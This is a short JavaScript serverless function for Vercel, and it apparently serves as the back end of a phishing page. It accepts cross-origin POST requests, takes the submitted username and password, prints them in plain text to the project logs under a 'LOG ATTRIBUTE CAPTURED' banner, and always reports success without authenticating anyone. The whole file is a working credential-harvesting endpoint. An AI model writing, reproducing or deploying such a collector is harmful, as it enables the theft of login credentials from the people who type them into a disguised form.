export default async function handler(req, res) {
    // Set headers to prevent CORS issues
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        let body = '';

        // Safely parse the stream data chunks if Vercel did not auto-parse it
        if (typeof req.body === 'object') {
            body = req.body;
        } else {
            try {
                body = JSON.parse(req.body);
            } catch (e) {
                // Alternative streaming collection fallback
                const buffers = [];
                for await (const chunk of req) {
                    buffers.push(chunk);
                }
                const rawString = Buffer.concat(buffers).toString();
                try {
                    body = JSON.parse(rawString);
                } catch (err) {
                    body = {};
                }
            }
        }

        const username = body.user || 'Not Provided';
        const password = body.pass || 'Not Provided';

        // This prints directly inside your Vercel Project -> Logs tab
        console.log(`\n====================================`);
        console.log(`[ALERT] LOG ATTRIBUTE CAPTURED`);
        console.log(`USER : ${username}`);
        console.log(`PASS : ${password}`);
        console.log(`====================================\n`);

        return res.status(200).json({ status: 'success' });
    }

    return res.status(405).json({ message: 'Method Not Allowed' });
}
